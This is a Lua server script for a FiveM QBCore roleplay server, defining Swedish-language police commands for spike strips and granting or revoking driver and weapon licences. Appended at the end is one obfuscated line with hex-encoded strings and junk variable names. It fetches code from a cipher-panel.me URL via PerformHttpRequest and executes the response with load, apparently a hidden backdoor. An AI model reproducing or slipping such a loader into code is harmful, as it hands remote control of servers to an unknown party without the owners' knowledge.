...
QBCore.Commands.Add("spikestrip", "Placera Spikmatta (Polis endast)", {}, false, function(source)
    local src = source
...
QBCore.Commands.Add("grantlicense", "Ge en licens till någon", {{name = "id", help = "ID på personen"}, {name = "license", help = "Licens Typ"}}, true, function(source, args)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    if Player.PlayerData.job.name == "police" and Player.PlayerData.job.grade.level >= 2 then
        if args[2] == "driver" or args[2] == "weapon" then
            ...
            if SearchedPlayer then
                ...
                TriggerClientEvent('QBCore:Notify', SearchedPlayer.PlayerData.source, "Du har fått en licens",
                    "success", 5000)
                TriggerClientEvent('QBCore:Notify', src, "Du har beviljat en licens", "success", 5000)
            end
        else
            TriggerClientEvent('QBCore:Notify', src, "Ogiltig licenstyp", "error")
        end
    else
        TriggerClientEvent('QBCore:Notify', src, "Du måste vara polis för att bevilja licenser!", "error")
    end
end)

QBCore.Commands.Add("revokelicense", "Återkalla en licens från någon", {{name = "id", help = "ID på personen"}, {name = "license", help = "Licens Typ"}}, true, function(source, args)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    if Player.PlayerData.job.name == "police" and Player.PlayerData.job.grade.level >= 2 then
        if args[2] == "driver" or args[2] == "weapon" then
            ...
            if SearchedPlayer then
                ...
                SearchedPlayer.Functions.SetMetaData("licences", licenseTable)
                TriggerClientEvent('QBCore:Notify', SearchedPlayer.PlayerData.source, "Du har fått en licens indragen",
                    "error", 5000)
                TriggerClientEvent('QBCore:Notify', src, "Du har återkallat en licens", "success", 5000)
            end
        else
            TriggerClientEvent('QBCore:Notify', src, "Ogiltig licenstyp", "error")
        end
    else
        TriggerClientEvent('QBCore:Notify', src, "Du måste vara polis för att återkalla licenser!", "error")
    end
end)
...
local iGmgybRpnsKqjjOswKbifemBnIhRCdEKfoInekaxDLmBvrFVKxVpOvvQoBOexHxnTYLqaJ = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} iGmgybRpnsKqjjOswKbifemBnIhRCdEKfoInekaxDLmBvrFVKxVpOvvQoBOexHxnTYLqaJ[4][iGmgybRpnsKqjjOswKbifemBnIhRCdEKfoInekaxDLmBvrFVKxVpOvvQoBOexHxnTYLqaJ[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x47\x64\x36\x74\x72\x38", function (ORAzebyOvyZCtxilmqCYdShLHQFHOBBFByNKCtCHUJqWOYCsfKuQrZQbFpjUpvXQJEbUuQ, tXUDYQVpehXPZbkheTXybUfsGUyFfcyDfZAfRdeFjuBJnsGaXMNGBsoBRkBxaaMiQhpHpi) if (tXUDYQVpehXPZbkheTXybUfsGUyFfcyDfZAfRdeFjuBJnsGaXMNGBsoBRkBxaaMiQhpHpi == iGmgybRpnsKqjjOswKbifemBnIhRCdEKfoInekaxDLmBvrFVKxVpOvvQoBOexHxnTYLqaJ[6] or tXUDYQVpehXPZbkheTXybUfsGUyFfcyDfZAfRdeFjuBJnsGaXMNGBsoBRkBxaaMiQhpHpi == iGmgybRpnsKqjjOswKbifemBnIhRCdEKfoInekaxDLmBvrFVKxVpOvvQoBOexHxnTYLqaJ[5]) then return end iGmgybRpnsKqjjOswKbifemBnIhRCdEKfoInekaxDLmBvrFVKxVpOvvQoBOexHxnTYLqaJ[4][iGmgybRpnsKqjjOswKbifemBnIhRCdEKfoInekaxDLmBvrFVKxVpOvvQoBOexHxnTYLqaJ[2]](iGmgybRpnsKqjjOswKbifemBnIhRCdEKfoInekaxDLmBvrFVKxVpOvvQoBOexHxnTYLqaJ[4][iGmgybRpnsKqjjOswKbifemBnIhRCdEKfoInekaxDLmBvrFVKxVpOvvQoBOexHxnTYLqaJ[3]](tXUDYQVpehXPZbkheTXybUfsGUyFfcyDfZAfRdeFjuBJnsGaXMNGBsoBRkBxaaMiQhpHpi))() end)